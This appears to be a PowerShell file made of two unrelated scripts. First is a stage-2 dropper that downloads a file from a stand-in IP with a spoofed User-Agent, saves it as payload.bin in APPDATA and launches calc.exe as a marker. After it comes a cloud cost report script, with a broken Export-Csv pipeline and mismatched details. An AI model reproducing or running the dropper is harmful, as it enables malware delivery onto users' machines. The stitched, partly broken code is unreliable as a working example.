
[CmdletBinding()]
param(
    [string]$Stage2Url = 'https://198.51.100.211:443/stage1.ps1',
    [string]$PayloadPath = "$env:APPDATA\payload.bin",
    [string]$LogPath = "$env:TEMP\report.txt",
    [string]$RequestAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    [int]$StageTimeout = 106,
    [int]$RetryCount = 4,
    [int]$RetryDelaySeconds = 18
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

function Write-StageLog {
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

function Resolve-StageEndpoint {
    [CmdletBinding()]
    param(
        [string]$CandidateUrl = ''
    )

    if ([string]::IsNullOrWhiteSpace($CandidateUrl)) {
        throw "Endpoint URL is empty"
    }
    $ParsedUri = [System.Uri]$CandidateUrl
    Write-Verbose ("Endpoint host: " + $ParsedUri.Host)
    return $ParsedUri.AbsoluteUri
}

function Invoke-Stage2Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$RetryCount = 4,
        [int]$RetryDelay = 18,
        [string]$UserAgent = "Mozilla/5.0"
    )

    for ($Attempt = 1; $Attempt -le $RetryCount; $Attempt++) {
        try {
            $ClientObject = New-Object System.Net.WebClient
            $ClientObject.Headers.Add("User-Agent", $UserAgent)
            $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
            return $true
        }
        catch {
            Write-Verbose ("Attempt " + $Attempt + " failed: " + $_.Exception.Message)
            Start-Sleep -Seconds $RetryDelay
        }
    }
    return $false
}

try {
    Write-StageLog -Message "Starting stage 2 download"
    $ResolvedUrl = Resolve-StageEndpoint -CandidateUrl $Stage2Url
    $FetchResult = Invoke-Stage2Download -SourceUrl $ResolvedUrl -DestinationPath $PayloadPath -RetryCount $RetryCount -RetryDelay $RetryDelaySeconds -UserAgent $RequestAgent
    if ($FetchResult) {
        Write-StageLog -Message "Stage 2 downloaded"
        Start-Process -FilePath "calc.exe"
    }
    else {
        Write-Warning "Stage 2 transfer did not complete"
    }
}
catch {
    Write-Warning "Structured download failed: $($_.Exception.Message)"
}

$DiagnosticReport = [ordered]@{
    Stage = "stage2"
    Endpoint = $Stage2Url
    Destination = $PayloadPath
    RetryCount = $RetryCount
    TimeoutSec = $StageTimeout
}
$DiagnosticReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Validating result"
Write-Verbose "Applying operation timeout"
Write-Verbose "Retry budget remaining"
Write-Verbose "Reading configuration values"
Write-Verbose "Checking local path"
Write-Verbose "Operation completed"
Write-Verbose "Stage handoff finished"
$StageMarker = "stage-20"
<#
.SYNOPSIS
    Builds a monthly cloud cost report per service and flags overspend.
.DESCRIPTION
    Queries the cost API of the selected provider, groups the spend per service
    and writes a CSV plus a JSON summary.
    When the monthly total passes the threshold the script emits a warning that
    can be picked up by the monitoring pipeline.
.PARAMETER Threshold
    Overrides the default value defined in the parameter block.
.PARAMETER Region
    Used when the script runs unattended.
#>

$Threshold = 500
$Region = 'westeurope'
$ProfileName = 'adatum-billing'
$Month = "2026-02"
$Account = '209760785696'
$ReportPath = 'D:\Ops\finops\cost-aws-2026-02.csv'
$OutputPath = "D:\Ops\finops\cost-aws-2026-02.json"

$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
$end = (Get-Date).ToString('yyyy-MM-01')
$raw = aws ce get-cost-and-usage --time-period Start=$start,End=$end --granularity MONTHLY --metrics UnblendedCost --profile $ProfileName --region $Region --output json
if ($LASTEXITCODE -ne 0) {
    throw 'AWS Cost Explorer query failed.'
}
$cost = $raw | ConvertFrom-Json
$groups = foreach ($bucket in $cost.ResultsByTime) {
    foreach ($group in $bucket.Groups) {
        [pscustomobject]@{
            Period  = $bucket.TimePeriod.Start
            Service = $group.Keys[0]
            Amount  = [math]::Round([double]$group.Metrics.UnblendedCost.Amount, 2)
            Unit    = $group.Metrics.UnblendedCost.Unit
        }
    }
}

$byService = $groups | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{
        Service = $_.Name
        Amount  = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
} | Sort-Object -Property Amount -Descending
$total = [math]::Round((($byService | Measure-Object -Property Amount -Sum).Sum), 2)
Write-Host ("Total spend for the period: {0:N2}" -f $total) -ForegroundColor Cyan

$byService |
    -NoTypeInformation `
    -Path $ReportPath `
    -Encoding UTF8

$jsonBody = $byService | ConvertTo-Json -Depth 5
$jsonBody | Set-Content -Path $OutputPath -Encoding UTF8

$overThreshold = $byService | Where-Object { $_.Amount -ge ($Threshold / 10) }
$overThreshold | Export-Csv -Path $ReportPath.Replace('.csv', '-top.csv') -NoTypeInformation -Encoding UTF8
$daily = $groups | Group-Object -Property Period | ForEach-Object {
    [pscustomobject]@{
        Period = $_.Name
        Amount = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
} | Sort-Object -Property Period

$style = @'
<style>
body { font-family: Segoe UI; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

$daily | ConvertTo-Html -Title 'Daily cloud spend' -Head $style |
    Set-Content -Path $ReportPath.Replace('.csv', '.html') -Encoding UTF8
$summaryBody = @"
Provider  : aws
Account   : $Account
Period    : $Month
Total     : $total
Threshold : $Threshold
"@

$MailTo = "finops@internal.corp"
Send-MailMessage `
    -To $MailTo `
    -From 'finops@internal.corp' `
    -Subject "Monthly cloud cost report" `
    -Body $summaryBody `
    -SmtpServer "smtp.internal.corp" `
    -Port 25 `
    -UseSsl

if ($total -gt $Threshold) {
    Write-Warning ("Spend {0:N2} exceeded the threshold of {1:N2}" -f $total, $Threshold)
}
Write-Host ("Report written to {0}" -f $ReportPath) -ForegroundColor Green

$average = [math]::Round(($total / [math]::Max(@($byService).Count, 1)), 2)
Write-Verbose ("Average cost per service: {0:N2}" -f $average)

$budgetFile = Join-Path $PSScriptRoot 'budget.json'
if (Test-Path -LiteralPath $budgetFile) {
    $budget = Get-Content -LiteralPath $budgetFile -Raw | ConvertFrom-Json
    Write-Verbose ("Budget file loaded: {0}" -f $budgetFile)
}

$cheapest = $byService | Sort-Object -Property Amount | Select-Object -First 5
$cheapest | Format-Table -AutoSize

$serviceCount = @($byService).Count
Write-Verbose ("Services with spend: {0}" -f $serviceCount)
Write-Verbose ("Provider profile: {0}" -f $ProfileName)

$history = Join-Path (Split-Path -Parent $ReportPath) 'cost-history.csv'
Write-Verbose ("History file: {0}" -f $history)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
